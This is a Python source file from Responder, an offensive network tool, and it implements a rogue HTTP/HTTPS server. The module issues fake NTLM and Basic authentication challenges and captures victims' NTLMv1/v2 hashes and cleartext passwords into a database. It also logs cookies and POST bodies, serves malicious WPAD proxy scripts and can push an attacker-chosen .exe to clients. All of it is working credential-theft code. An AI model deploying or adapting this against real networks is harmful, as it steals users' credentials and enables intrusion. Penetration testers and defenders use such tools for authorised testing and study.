#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import struct
import core.responder.settings as settings
import threading

from SocketServer import BaseServer, BaseRequestHandler, StreamRequestHandler, ThreadingMixIn, TCPServer
from base64 import b64decode, b64encode
from core.responder.utils import *

from core.logger import logger
from core.responder.packets import NTLM_Challenge
from core.responder.packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans
from core.responder.packets import WPADScript, ServeExeFile, ServeHtmlFile

formatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("HTTP", formatter)

class HTTP:

	static_endpoints = {}
	endpoints = {}

	@staticmethod
	def add_endpoint(url, content_type, payload):
		Buffer = ServeHtmlFile(ContentType="Content-Type: {}\r\n".format(content_type), Payload=payload)
		Buffer.calculate()
		HTTP.endpoints['/' + url] = Buffer

	@staticmethod
	def add_static_endpoint(url, content_type, path):
		Buffer = ServeHtmlFile(ContentType="Content-Type: {}\r\n".format(content_type))
		HTTP.static_endpoints['/' + url] = {'buffer': Buffer, 'path': path}

	def start(self):
		try:
			#if OsInterfaceIsSupported():
				#server = ThreadingTCPServer((settings.Config.Bind_To, 80), HTTP1)
			#else:
			server = ThreadingTCPServer(('0.0.0.0', 80), HTTP1)

			t = threading.Thread(name='HTTP', target=server.serve_forever)
			t.setDaemon(True)
			t.start()

		except Exception as e:
			print "Error starting HTTP server: {}".format(e)

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    
    allow_reuse_address = 1

    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
            except:
                pass
        TCPServer.server_bind(self)

# Parse NTLMv1/v2 hash.
def ParseHTTPHash(data, client):
	LMhashLen    = struct.unpack('<H',data[12:14])[0]
	LMhashOffset = struct.unpack('<H',data[16:18])[0]
	LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	
	NthashLen    = struct.unpack('<H',data[20:22])[0]
	NthashOffset = struct.unpack('<H',data[24:26])[0]
	NTHash       = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
	
	UserLen      = struct.unpack('<H',data[36:38])[0]
	UserOffset   = struct.unpack('<H',data[40:42])[0]
	User         = data[UserOffset:UserOffset+UserLen].replace('\x00','')

	if NthashLen == 24:
		HostNameLen     = struct.unpack('<H',data[46:48])[0]
		HostNameOffset  = struct.unpack('<H',data[48:50])[0]
		HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, settings.Config.NumChal)

		SaveToDb({
			'module': 'HTTP', 
			'type': 'NTLMv1', 
			'client': client, 
			'host': HostName, 
			'user': User, 
			'hash': LMHash+":"+NTHash, 
			'fullhash': WriteHash,
		})

	if NthashLen > 24:
		NthashLen      = 64
		DomainLen      = struct.unpack('<H',data[28:30])[0]
		DomainOffset   = struct.unpack('<H',data[32:34])[0]
		Domain         = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		HostNameLen    = struct.unpack('<H',data[44:46])[0]
		HostNameOffset = struct.unpack('<H',data[48:50])[0]
		HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])

		SaveToDb({
			'module': 'HTTP', 
			'type': 'NTLMv2', 
			'client': client, 
			'host': HostName, 
			'user': Domain+'\\'+User, 
			'hash': NTHash[:32]+":"+NTHash[32:], 
			'fullhash': WriteHash,
		})

def GrabCookie(data, host):
	Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)

	if Cookie:
		Cookie = Cookie.group(0).replace('Cookie: ', '')
		if len(Cookie) > 1 and settings.Config.Verbose:
			log.info("[HTTP] Cookie           : {}".format(Cookie))
		return Cookie
	else:
		return False

def GrabHost(data, host):
	Host = re.search('(Host:*.\=*)[^\r\n]*', data)

	if Host:
		Host = Host.group(0).replace('Host: ', '')
		if settings.Config.Verbose:
			log.info("[HTTP] Host             : {}".format(Host, 3))
		return Host
	else:
		return False

def WpadCustom(data, client):
	Wpad = re.search('(/wpad.dat|/*\.pac)', data)
	if Wpad:
		Buffer = WPADScript(Payload=settings.Config.WPAD_Script)
		Buffer.calculate()
		return str(Buffer)
	else:
		return False

def ServeFile(Filename):
	with open (Filename, "rb") as bk:
		data = bk.read()
		bk.close()
		return data

def RespondWithFile(client, filename, dlname=None):
	
	if filename.endswith('.exe'):
		Buffer = ServeExeFile(Payload = ServeFile(filename), ContentDiFile=dlname)
	else:
		Buffer = ServeHtmlFile(Payload = ServeFile(filename))

	Buffer.calculate()
	log.info("{} [HTTP] Sending file {}".format(filename, client))

	return str(Buffer)

def GrabURL(data, host):
	GET = re.findall('(?<=GET )[^HTTP]*', data)
	POST = re.findall('(?<=POST )[^HTTP]*', data)
	POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)

	if GET:
		req = ''.join(GET).strip()
		log.info("[HTTP] {} - - GET '{}'".format(host, req))
		return req

	if POST:
		req = ''.join(POST).strip()
		log.info("[HTTP] {} - - POST '{}'".format(host, req))
		if len(''.join(POSTDATA)) > 2:
			log.info("[HTTP] POST Data: {}".format(''.join(POSTDATA).strip()))
		return req

# Handle HTTP packet sequence.
def PacketSequence(data, client):
	NTLM_Auth = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
	Basic_Auth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)

	# Serve the .exe if needed
	if settings.Config.Serve_Always == True or (settings.Config.Serve_Exe == True and re.findall('.exe', data)):
		return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)

	# Serve the custom HTML if needed
	if settings.Config.Serve_Html == True:
		return RespondWithFile(client, settings.Config.Html_Filename)

	WPAD_Custom = WpadCustom(data, client)
	
	if NTLM_Auth:
		Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]

		if Packet_NTLM == "\x01":
			GrabURL(data, client)
			GrabHost(data, client)
			GrabCookie(data, client)

			Buffer = NTLM_Challenge(ServerChallenge=settings.Config.Challenge)
			Buffer.calculate()

			Buffer_Ans = IIS_NTLM_Challenge_Ans()
			Buffer_Ans.calculate(str(Buffer))

			return str(Buffer_Ans)

		if Packet_NTLM == "\x03":
			NTLM_Auth = b64decode(''.join(NTLM_Auth))
			ParseHTTPHash(NTLM_Auth, client)

			if settings.Config.Force_WPAD_Auth and WPAD_Custom:
				log.info("{} [HTTP] WPAD (auth) file sent".format(client))
				return WPAD_Custom

			else:
				Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
				Buffer.calculate()
				return str(Buffer)

	elif Basic_Auth:
		ClearText_Auth = b64decode(''.join(Basic_Auth))

		GrabURL(data, client)
		GrabHost(data, client)
		GrabCookie(data, client)

		SaveToDb({
			'module': 'HTTP', 
			'type': 'Basic', 
			'client': client, 
			'user': ClearText_Auth.split(':')[0], 
			'cleartext': ClearText_Auth.split(':')[1], 
		})

		if settings.Config.Force_WPAD_Auth and WPAD_Custom:
			if settings.Config.Verbose:
				log.info("{} [HTTP] Sent WPAD (auth) file" .format(client))
			return WPAD_Custom

		else:
			Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
			Buffer.calculate()
			return str(Buffer)

	else:
		if settings.Config.Basic == True:
			Response = IIS_Basic_401_Ans()
			if settings.Config.Verbose:
				log.info("{} [HTTP] Sending BASIC authentication request".format(client))

		else:
			Response = IIS_Auth_401_Ans()
			if settings.Config.Verbose:
				log.info("{} [HTTP] Sending NTLM authentication request".format(client))

		return str(Response)

# HTTP Server class
class HTTP1(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				self.request.settimeout(1)
				data = self.request.recv(8092)
				req_url = GrabURL(data, self.client_address[0])
				Buffer = WpadCustom(data, self.client_address[0])

				if Buffer and settings.Config.Force_WPAD_Auth == False:
					self.request.send(Buffer)
					if settings.Config.Verbose:
						log.info("{} [HTTP] Sent WPAD (no auth) file".format(self.client_address[0]))

				if (req_url is not None) and (req_url.strip() in HTTP.endpoints):
					resp = HTTP.endpoints[req_url.strip()]
					self.request.send(str(resp))

				if (req_url is not None) and (req_url.strip() in HTTP.static_endpoints):
					path = HTTP.static_endpoints[req_url.strip()]['path']
					Buffer = HTTP.static_endpoints[req_url.strip()]['buffer']
					with open(path, 'r') as file:
						Buffer.fields['Payload'] = file.read()

					Buffer.calculate()
					self.request.send(str(Buffer))

				else:
					Buffer = PacketSequence(data,self.client_address[0])
					self.request.send(Buffer)
		except socket.error:
			pass

# HTTPS Server class
class HTTPS(StreamRequestHandler):
	def setup(self):
		self.exchange = self.request
		self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
		self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

	def handle(self):
		try:
			while True:
				data = self.exchange.recv(8092)
				self.exchange.settimeout(0.5)
				Buffer = WpadCustom(data,self.client_address[0])
				
				if Buffer and settings.Config.Force_WPAD_Auth == False:
					self.exchange.send(Buffer)
					if settings.Config.Verbose:
						log.info("{} [HTTPS] Sent WPAD (no auth) file".format(self.client_address[0]))

				else:
					Buffer = PacketSequence(data,self.client_address[0])
					self.exchange.send(Buffer)
		except:
			pass

# SSL context handler
class SSLSock(ThreadingMixIn, TCPServer):
	def __init__(self, server_address, RequestHandlerClass):
		from OpenSSL import SSL

		BaseServer.__init__(self, server_address, RequestHandlerClass)
		ctx = SSL.Context(SSL.SSLv3_METHOD)

		cert = os.path.join(settings.Config.ResponderPATH, settings.Config.SSLCert)
		key =  os.path.join(settings.Config.ResponderPATH, settings.Config.SSLKey)

		ctx.use_privatekey_file(key)
		ctx.use_certificate_file(cert)

		self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
		self.server_bind()
		self.server_activate()

	def shutdown_request(self,request):
		try:
			request.shutdown()
		except:
			pass
